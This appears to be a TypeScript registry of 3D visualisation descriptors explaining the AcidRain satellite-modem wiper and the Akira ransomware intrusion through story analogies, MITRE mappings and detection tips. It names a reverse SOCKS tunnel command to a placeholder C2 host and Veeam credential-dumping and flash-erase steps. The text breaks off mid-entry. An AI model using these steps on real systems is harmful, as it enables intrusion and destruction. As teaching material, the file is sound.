import type { Section3DDescriptor, Section3DKey } from '@/lib/section-3d-registry';

/**
 * Bespoke 3D Story-to-Technical Section Descriptors for RANSOMWARE_EXTORTION (20 scenarios).
 */
export const RANSOMWARE_EXTORTION_3D_REGISTRY: Record<
  string,
  Partial<Record<Section3DKey, Section3DDescriptor>>
> = {
  "acidrain-viasat-ka-sat-modem-wiper": {
    "briefing": {
      "scenarioId": "acidrain-viasat-ka-sat-modem-wiper",
      "sectionKey": "briefing",
      "sceneKind": "ran-acidrain-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1199",
      "title": "AcidRain MIPS ELF Satellite Modem Wiper (/dev/mtd MEMERASE / Viasat… — Story-to-Technical Overview",
      "storyCue": "Imagine a satellite television control hub wired to tens of thousands of rooftop receiver boxes across an entire continent. Breaking into the trusted central management deck, a saboteur pushes one tiny remote-maintenance package down to every rooftop dish simultaneously; inside each box, the package first sweeps all ordinary storage cards and then fires raw hardware erase bolts directly into the soldered memory chips themselves, permanently silencing tens of thousands of satellite modems in one stroke.",
      "technicalCue": "INITIAL ACCESS: Management Plane Compromise & TR-069 CWMP Push of MIPS ELF Binary (ukrop) -> EXFIL & IMPACT: Block Device Enumeration (/dev/sda, /dev/mmcblk) & Sequential Overwrite -> EXFIL & IMPACT: Raw SPI Flash /dev/mtd0..99 Destruction via MEMUNLOCK, MEMERASE & MEMWRITEOOB",
      "storyMappings": [
        {
          "storyTerm": "Central management deck pushing one maintenance package to every dish",
          "technicalTerm": "Management plane compromise and mass TR-069 CWMP push of MIPS ELF wiper (ukrop)",
          "tone": "amber"
        },
        {
          "storyTerm": "Sweeping all ordinary storage cards sequentially",
          "technicalTerm": "Recursive overwrite of /dev/sda, /dev/mmcblk, and non-essential filesystem directories",
          "tone": "sky"
        },
        {
          "storyTerm": "Firing raw hardware erase bolts into soldered memory chips",
          "technicalTerm": "Raw SPI flash /dev/mtd0..99 destruction via MEMUNLOCK, MEMERASE, and MEMWRITEOOB",
          "tone": "rose"
        },
        {
          "storyTerm": "Permanently silencing tens of thousands of satellite modems",
          "technicalTerm": "Irrecoverable bricking of Viasat KA-SAT consumer and wind-turbine terminals",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#F59E0B",
      "durationSec": 18,
      "callouts": [
        {
          "id": "ran-acidrain-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Central management deck pushing one…",
          "subtitle": "Management plane compromise and mass TR-069 CWMP push of MIPS…",
          "tone": "amber"
        },
        {
          "id": "ran-acidrain-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Sweeping all ordinary storage cards…",
          "subtitle": "Recursive overwrite of /dev/sda, /dev/mmcblk, and…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Room",
          "stageTag": "STAGE 01 · INITIAL ACCESS",
          "title": "Management Plane Compromise & TR-069 CWMP Push of MIPS ELF Binary (ukrop)",
          "storyExcerpt": "Slipping past a misconfigured perimeter gate into the satellite ground-station master control room, the saboteur hijacks the official remote-update broadcaster and beams a tiny specialized demolition…",
          "technicalParallel": "Because ukrop had zero external library dependencies and brute-forced every conceivable Linux storage device path, it served as a universal embedded Linux/router/modem wiper.",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Up Each",
          "stageTag": "STAGE 02 · EXFIL & IMPACT",
          "title": "Block Device Enumeration (/dev/sda, /dev/mmcblk) & Sequential Overwrite",
          "storyExcerpt": "Waking up inside each modem with master system authority, the demolition program forks quietly into the background and sweeps across every attached storage partition and memory card, scrubbing every…",
          "technicalParallel": "By brute-forcing hundreds of device node names in a loop, AcidRain did not need to parse /proc/partitions or sysfs and worked across any embedded Linux distribution.",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Raw Slot",
          "stageTag": "STAGE 03 · EXFIL & IMPACT",
          "title": "Raw SPI Flash /dev/mtd0..99 Destruction via MEMUNLOCK, MEMERASE & MEMWRITEOOB",
          "storyExcerpt": "Finally, the wiper speaks straight to the modem raw soldered flash chips from slot zero through ninety-nine, reading each chip physical geometry, flipping off hardware write-locks, and issuing direct…",
          "technicalParallel": "Because /dev/mtd0 holds the primary U-Boot bootloader on embedded MIPS routers and satellite modems, erasing /dev/mtd0 rendered the modems physically unbootable and required physical hardware replacement…",
          "accentHex": "#F59E0B",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Dish Array",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Modem Wiper",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Uplink Beam",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "acidrain-viasat-ka-sat-modem-wiper",
      "sectionKey": "step-1",
      "sceneKind": "ran-acidrain-step-1",
      "stageBadge": "STEP #1 · INITIAL ACCESS",
      "title": "Management Plane Compromise & TR-069 CWMP Push of MIPS ELF Binary (ukrop)",
      "storyCue": "Slipping past a misconfigured perimeter gate into the satellite ground-station master control room, the saboteur hijacks the official remote-update broadcaster and beams a tiny specialized demolition program simultaneously into tens of thousands of distant rooftop modems.",
      "technicalCue": "T1199 · INITIAL ACCESS — After exploiting a VPN misconfiguration to enter the trusted management segment of the Viasat KA-SAT ground network, the threat actors issued mass management commands over the TR-069 (CWMP)…",
      "storyMappings": [
        {
          "storyTerm": "Satellite ground-station master control room",
          "technicalTerm": "Trusted management segment of the Viasat KA-SAT satellite network",
          "tone": "amber"
        },
        {
          "storyTerm": "Official remote-update broadcaster",
          "technicalTerm": "TR-069 CPE WAN Management Protocol (CWMP) pushing mass firmware commands",
          "tone": "sky"
        },
        {
          "storyTerm": "Tiny specialized demolition program",
          "technicalTerm": "Compact MIPS ELF AcidRain wiper binary (ukrop) staged into /tmp",
          "tone": "rose"
        },
        {
          "storyTerm": "Simultaneous fleet-wide arrival",
          "technicalTerm": "Mass execution across tens of thousands of SurfBeam 2 embedded Linux modems",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#F43F5E",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-acidrain-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Satellite ground-station master control…",
          "subtitle": "Trusted management segment of the Viasat KA-SAT satellite…",
          "tone": "amber"
        },
        {
          "id": "ran-acidrain-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Official remote-update broadcaster",
          "subtitle": "TR-069 CPE WAN Management Protocol (CWMP) pushing mass…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Room",
          "stageTag": "STEP 01 · SETUP",
          "title": "Satellite ground-station master control room",
          "storyExcerpt": "Slipping past a misconfigured perimeter gate into the satellite ground-station master control room, the saboteur hijacks the official remote-update broadcaster and beams a tiny specialized…",
          "technicalParallel": "Because ukrop had zero external library dependencies and brute-forced every conceivable Linux storage device path, it served as a universal embedded Linux/router/modem wiper.",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses Tiny",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Official remote-update broadcaster",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses official remote-update broadcaster to advance toward tiny specialized demolition program.",
          "technicalParallel": "After exploiting a VPN misconfiguration to enter the trusted management segment of the Viasat KA-SAT ground network, the threat actors issued mass management commands over the TR-069 (CWMP) protocol to…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Tiny",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Simultaneous fleet-wide arrival",
          "storyExcerpt": "Behind the scenes, simultaneous fleet-wide arrival captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Monitor SATCOM management-plane telemetry for sudden mass TR-069 Download or firmware execution broadcasts (which deviate sharply from staged maintenance waves) paired with embedded host alerts for…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Dish Array",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Modem Wiper",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Uplink Beam",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1199"
    },
    "step-2": {
      "scenarioId": "acidrain-viasat-ka-sat-modem-wiper",
      "sectionKey": "step-2",
      "sceneKind": "ran-acidrain-step-2",
      "stageBadge": "STEP #2 · EXFIL & IMPACT",
      "title": "Block Device Enumeration (/dev/sda, /dev/mmcblk) & Sequential Overwrite",
      "storyCue": "Waking up inside each modem with master system authority, the demolition program forks quietly into the background and sweeps across every attached storage partition and memory card, scrubbing every directory clean before turning to the raw hardware chips.",
      "technicalCue": "T1561.002 · EXFIL & IMPACT — Forking into the background as root (UID 0), AcidRain first recursively overwrote files across non-essential filesystem directories, then systematically generated device paths for…",
      "storyMappings": [
        {
          "storyTerm": "Forking quietly into the background with master authority",
          "technicalTerm": "AcidRain daemonizing as root (UID 0) on the embedded Linux modem OS",
          "tone": "amber"
        },
        {
          "storyTerm": "Sweeping every attached storage partition and memory card",
          "technicalTerm": "Iterative overwrite across /dev/sda*, /dev/mmcblk*, and non-essential directories",
          "tone": "sky"
        },
        {
          "storyTerm": "Writing straight over raw block devices",
          "technicalTerm": "Opening /dev/mtdblock* and /dev/mmcblk* with O_WRONLY / O_RDWR flags",
          "tone": "rose"
        },
        {
          "storyTerm": "Embedded system watchman catching the wipe",
          "technicalTerm": "Syscall auditing alerting on raw block-device writes outside firmware upgraders",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#F43F5E",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-acidrain-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Forking quietly into the background with…",
          "subtitle": "AcidRain daemonizing as root (UID 0) on the embedded Linux…",
          "tone": "amber"
        },
        {
          "id": "ran-acidrain-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Sweeping every attached storage…",
          "subtitle": "Iterative overwrite across /dev/sda*, /dev/mmcblk*, and…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Up Each",
          "stageTag": "STEP 02 · SETUP",
          "title": "Forking quietly into the background with master…",
          "storyExcerpt": "Waking up inside each modem with master system authority, the demolition program forks quietly into the background and sweeps across every attached storage partition and memory card, scrubbing…",
          "technicalParallel": "By brute-forcing hundreds of device node names in a loop, AcidRain did not need to parse /proc/partitions or sysfs and worked across any embedded Linux distribution.",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Card",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Sweeping every attached storage partition and memory…",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses sweeping every attached storage partition and memory card to advance toward writing straight over raw block devices.",
          "technicalParallel": "Forking into the background as root (UID 0), AcidRain first recursively overwrote files across non-essential filesystem directories, then systematically generated device paths for /dev/sda../dev/sdz…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Over Raw",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Embedded system watchman catching the wipe",
          "storyExcerpt": "Behind the scenes, embedded system watchman catching the wipe captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Enable embedded Linux syscall auditing (monitoring low-level kernel open and write calls) alerting whenever processes other than signed firmware upgrade daemons open /dev/mtdblock* or /dev/mmcblk* with…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Dish Array",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Modem Wiper",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Uplink Beam",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1561.002"
    },
    "step-3": {
      "scenarioId": "acidrain-viasat-ka-sat-modem-wiper",
      "sectionKey": "step-3",
      "sceneKind": "ran-acidrain-step-3",
      "stageBadge": "STEP #3 · EXFIL & IMPACT",
      "title": "Raw SPI Flash /dev/mtd0..99 Destruction via MEMUNLOCK, MEMERASE & MEMWRITEOOB",
      "storyCue": "Finally, the wiper speaks straight to the modem raw soldered flash chips from slot zero through ninety-nine, reading each chip physical geometry, flipping off hardware write-locks, and issuing direct chip-erase pulses so the modem cannot even read its own startup instructions after reboot.",
      "technicalCue": "T1495 · EXFIL & IMPACT — For character-mode flash devices /dev/mtd0 through /dev/mtd99, AcidRain queried flash geometry via MEMGETINFO and then looped through every eraseblock issuing ioctl(fd, MEMUNLOCK) (unlocking…",
      "storyMappings": [
        {
          "storyTerm": "Raw soldered flash chips from slot zero through ninety-nine",
          "technicalTerm": "Character-mode Memory Technology Devices /dev/mtd0 through /dev/mtd99",
          "tone": "amber"
        },
        {
          "storyTerm": "Reading physical geometry and flipping off hardware locks",
          "technicalTerm": "Linux MTD ioctl calls MEMGETINFO followed by MEMUNLOCK",
          "tone": "sky"
        },
        {
          "storyTerm": "Direct chip-erase pulses destroying startup instructions",
          "technicalTerm": "Raw hardware flash erasure via MEMERASE and MEMWRITEOOB ioctls",
          "tone": "rose"
        },
        {
          "storyTerm": "Permanently silenced hardware requiring physical replacement",
          "technicalTerm": "Unbootable bricked modems requiring hardware swap across European deployments",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-acidrain-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Raw soldered flash chips from slot zero…",
          "subtitle": "Character-mode Memory Technology Devices /dev/mtd0 through…",
          "tone": "amber"
        },
        {
          "id": "ran-acidrain-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Reading physical geometry and flipping…",
          "subtitle": "Linux MTD ioctl calls MEMGETINFO followed by MEMUNLOCK",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Raw Slot",
          "stageTag": "STEP 03 · SETUP",
          "title": "Raw soldered flash chips from slot zero through…",
          "storyExcerpt": "Finally, the wiper speaks straight to the modem raw soldered flash chips from slot zero through ninety-nine, reading each chip physical geometry, flipping off hardware write-locks, and issuing…",
          "technicalParallel": "Because /dev/mtd0 holds the primary U-Boot bootloader on embedded MIPS routers and satellite modems, erasing /dev/mtd0 rendered the modems physically unbootable and required physical hardware replacement…",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses Off",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Reading physical geometry and flipping off hardware…",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses reading physical geometry and flipping off hardware locks to advance toward direct chip-erase pulses destroying startup instructions.",
          "technicalParallel": "For character-mode flash devices /dev/mtd0 through /dev/mtd99, AcidRain queried flash geometry via MEMGETINFO and then looped through every eraseblock issuing ioctl(fd, MEMUNLOCK) (unlocking…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Chip-erase",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Permanently silenced hardware requiring physical…",
          "storyExcerpt": "Behind the scenes, permanently silenced hardware requiring physical replacement captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Hardware write-protect strapping (WP# pin grounded) on bootloader SPI NOR flash regions so software MEMUNLOCK/MEMERASE IOCTLs are rejected by the flash chip hardware.",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Dish Array",
          "position": [
            -6.3,
            4.2,
            8.4
          ],
          "target": [
            -4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Modem Wiper",
          "position": [
            4.3,
            4.2,
            8.4
          ],
          "target": [
            2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Uplink Beam",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1495"
    }
  },
  "akira-ransomware-cisco-anyconnect-esxi": {
    "briefing": {
      "scenarioId": "akira-ransomware-cisco-anyconnect-esxi",
      "sectionKey": "briefing",
      "sceneKind": "ran-akira-esxi-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1133",
      "title": "Akira Ransomware Cisco ASA VPN Breach & ESXi Hypervisor Encryption… — Story-to-Technical Overview",
      "storyCue": "Imagine a corporate data center whose front lobby keycard reader still honors single-factor staff passwords without a pocket code. A burglar slips through the lobby door, threads a hidden garden hose out through a back vent to bring in extra helpers, raids the backup-vault clerk desk to steal the master building-basement keys, and then marches down to the basement to shut off every virtual apartment simultaneously and padlock their heavy foundation files.",
      "technicalCue": "INITIAL ACCESS: Cisco ASA / AnyConnect Single-Factor VPN Breach (CVE-2023-20269 / CVE-2020-3259) -> CREDENTIAL ACCESS: Chisel SOCKS Tunneling, Veeam Credential Dumping & SSH Pivot to ESXi -> EXFIL & IMPACT: esxcli vm process kill & Rust-Based Akira ESXi Hypervisor Encryption",
      "storyMappings": [
        {
          "storyTerm": "Front lobby door accepting single-factor passwords",
          "technicalTerm": "Cisco ASA / FTD AnyConnect SSLVPN breach via CVE-2023-20269 or CVE-2020-3259",
          "tone": "amber"
        },
        {
          "storyTerm": "Hidden garden hose threaded out through a back vent",
          "technicalTerm": "chisel.exe reverse SOCKS tunnel bridging attacker tools into the internal LAN",
          "tone": "sky"
        },
        {
          "storyTerm": "Raiding the backup-vault clerk desk for basement keys",
          "technicalTerm": "Dumping [VeeamBackup].[dbo].[Credentials] via sqlcmd.exe and DPAPI decryption",
          "tone": "rose"
        },
        {
          "storyTerm": "Shutting off every virtual apartment and padlocking foundation files",
          "technicalTerm": "SSH esxcli vm process kill followed by Rust-based Akira ESXi VMDK encryption",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#22D3EE",
      "durationSec": 18,
      "callouts": [
        {
          "id": "ran-akira-esxi-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Front lobby door accepting single-factor…",
          "subtitle": "Cisco ASA / FTD AnyConnect SSLVPN breach via CVE-2023-20269 or…",
          "tone": "amber"
        },
        {
          "id": "ran-akira-esxi-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Hidden garden hose threaded out through…",
          "subtitle": "chisel.exe reverse SOCKS tunnel bridging attacker tools into…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Door",
          "stageTag": "STAGE 01 · INITIAL ACCESS",
          "title": "Cisco ASA / AnyConnect Single-Factor VPN Breach (CVE-2023-20269 / CVE-2020-3259)",
          "storyExcerpt": "Testing the exterior remote-access lobby door from an outside commercial warehouse, the intruder exploits a flaw in the single-password gate and walks cleanly into the internal office corridor without…",
          "technicalParallel": "Many administrators configured Duo/Azure MFA on their custom VPN tunnel group (Corp-MFA-Tunnel) but left the built-in DefaultWEBVPNGroup or DefaultRAGroup active with local/LDAP password-only…",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Tube Out",
          "stageTag": "STAGE 02 · CREDENTIAL ACCESS",
          "title": "Chisel SOCKS Tunneling, Veeam Credential Dumping & SSH Pivot to ESXi",
          "storyExcerpt": "Once inside the building, the intruder snakes a concealed reverse speaking tube out to their hideout, then visits the corporate backup-scheduler office to unlock its credential safe and lift the master…",
          "technicalParallel": "Because backup servers require high-privilege access to every hypervisor and domain controller to perform backups, compromising the Veeam database gives the attacker immediate Tier-0 hypervisor…",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Hard",
          "stageTag": "STAGE 03 · EXFIL & IMPACT",
          "title": "esxcli vm process kill & Rust-Based Akira ESXi Hypervisor Encryption",
          "storyExcerpt": "Descending into the basement hypervisor hall with stolen master keys, the intruder flips the hard power breakers on every running virtual office so their disk bolts release, then unleashes a fast Rust…",
          "technicalParallel": "Because most enterprises do not install EDR agents directly inside the proprietary VMware ESXi VMkernel OS, encrypting from the hypervisor shell bypasses all guest-OS Windows/Linux EDR agents installed…",
          "accentHex": "#22D3EE",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Lobby Door",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Server Vault",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Lock Wave",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "akira-ransomware-cisco-anyconnect-esxi",
      "sectionKey": "step-1",
      "sceneKind": "ran-akira-esxi-step-1",
      "stageBadge": "STEP #1 · INITIAL ACCESS",
      "title": "Cisco ASA / AnyConnect Single-Factor VPN Breach (CVE-2023-20269 / CVE-2020-3259)",
      "storyCue": "Testing the exterior remote-access lobby door from an outside commercial warehouse, the intruder exploits a flaw in the single-password gate and walks cleanly into the internal office corridor without ever passing a second-factor badge check.",
      "technicalCue": "T1133 · INITIAL ACCESS — Akira affiliates targeted WAN-facing Cisco ASA and Firepower Threat Defense (FTD) appliances, exploiting CVE-2020-3259 (an unauthenticated memory disclosure vulnerability that leaks active…",
      "storyMappings": [
        {
          "storyTerm": "Exterior remote-access lobby door",
          "technicalTerm": "WAN-facing Cisco ASA or Firepower Threat Defense (FTD) AnyConnect VPN",
          "tone": "amber"
        },
        {
          "storyTerm": "Single-password gate flaw",
          "technicalTerm": "CVE-2023-20269 / CVE-2020-3259 or credential stuffing against non-MFA VPN groups",
          "tone": "sky"
        },
        {
          "storyTerm": "Outside commercial warehouse",
          "technicalTerm": "External VPS and commercial hosting ASNs initiating VPN sessions",
          "tone": "rose"
        },
        {
          "storyTerm": "Lobby guard book recording the unusual entry",
          "technicalTerm": "Cisco ASA syslog %ASA-6-722022 and %ASA-6-113004 authentication events",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#F43F5E",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-akira-esxi-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Exterior remote-access lobby door",
          "subtitle": "WAN-facing Cisco ASA or Firepower Threat Defense (FTD)…",
          "tone": "amber"
        },
        {
          "id": "ran-akira-esxi-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Single-password gate flaw",
          "subtitle": "CVE-2023-20269 / CVE-2020-3259 or credential stuffing against…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Door",
          "stageTag": "STEP 01 · SETUP",
          "title": "Exterior remote-access lobby door",
          "storyExcerpt": "Testing the exterior remote-access lobby door from an outside commercial warehouse, the intruder exploits a flaw in the single-password gate and walks cleanly into the internal office corridor…",
          "technicalParallel": "Many administrators configured Duo/Azure MFA on their custom VPN tunnel group (Corp-MFA-Tunnel) but left the built-in DefaultWEBVPNGroup or DefaultRAGroup active with local/LDAP password-only…",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Gate Flaw",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Single-password gate flaw",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses single-password gate flaw to advance toward outside commercial warehouse.",
          "technicalParallel": "Akira affiliates targeted WAN-facing Cisco ASA and Firepower Threat Defense (FTD) appliances, exploiting CVE-2020-3259 (an unauthenticated memory disclosure vulnerability that leaks active session tokens…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Book",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Lobby guard book recording the unusual entry",
          "storyExcerpt": "Behind the scenes, lobby guard book recording the unusual entry captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Monitor Cisco ASA syslog events %ASA-6-722022 and %ASA-6-113004 (which log AnyConnect IP assignment and group authentication) for logins hitting DefaultWEBVPNGroup or DefaultRAGroup from external hosting…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Lobby Door",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Server Vault",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Lock Wave",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1133"
    },
    "step-2": {
      "scenarioId": "akira-ransomware-cisco-anyconnect-esxi",
      "sectionKey": "step-2",
      "sceneKind": "ran-akira-esxi-step-2",
      "stageBadge": "STEP #2 · CREDENTIAL ACCESS",
      "title": "Chisel SOCKS Tunneling, Veeam Credential Dumping & SSH Pivot to ESXi",
      "storyCue": "Once inside the building, the intruder snakes a concealed reverse speaking tube out to their hideout, then visits the corporate backup-scheduler office to unlock its credential safe and lift the master keys to the basement hypervisor racks.",
      "technicalCue": "T1555 · CREDENTIAL ACCESS — Pivoting to an internal Windows server, the operator launched chisel.exe client https://<c2>:8443 R:socks (establishing a fast TCP-over-HTTP/WebSocket reverse SOCKS5 tunnel) and queried the…",
      "storyMappings": [
        {
          "storyTerm": "Concealed reverse speaking tube out to the hideout",
          "technicalTerm": "chisel.exe client https://<c2>:8443 R:socks reverse SOCKS proxy",
          "tone": "amber"
        },
        {
          "storyTerm": "Corporate backup-scheduler credential safe",
          "technicalTerm": "Veeam Backup SQL table [VeeamBackup].[dbo].[Credentials] queried via sqlcmd.exe",
          "tone": "sky"
        },
        {
          "storyTerm": "Unwrapping the locked backup safe keys",
          "technicalTerm": "DPAPI CryptUnprotectData decryption of stored vCenter and ESXi root passwords",
          "tone": "rose"
        },
        {
          "storyTerm": "Stairwell leading straight to the basement racks",
          "technicalTerm": "Lateral SSH pivot directly onto VMware ESXi hypervisor management interfaces",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#F43F5E",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-akira-esxi-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Concealed reverse speaking tube out to…",
          "subtitle": "chisel.exe client https://<c2>:8443 R:socks reverse SOCKS proxy",
          "tone": "amber"
        },
        {
          "id": "ran-akira-esxi-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Corporate backup-scheduler credential safe",
          "subtitle": "Veeam Backup SQL table [VeeamBackup].[dbo].[Credentials]…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Tube Out",
          "stageTag": "STEP 02 · SETUP",
          "title": "Concealed reverse speaking tube out to the hideout",
          "storyExcerpt": "Once inside the building, the intruder snakes a concealed reverse speaking tube out to their hideout, then visits the corporate backup-scheduler office to unlock its credential safe and lift…",
          "technicalParallel": "Because backup servers require high-privilege access to every hypervisor and domain controller to perform backups, compromising the Veeam database gives the attacker immediate Tier-0 hypervisor…",
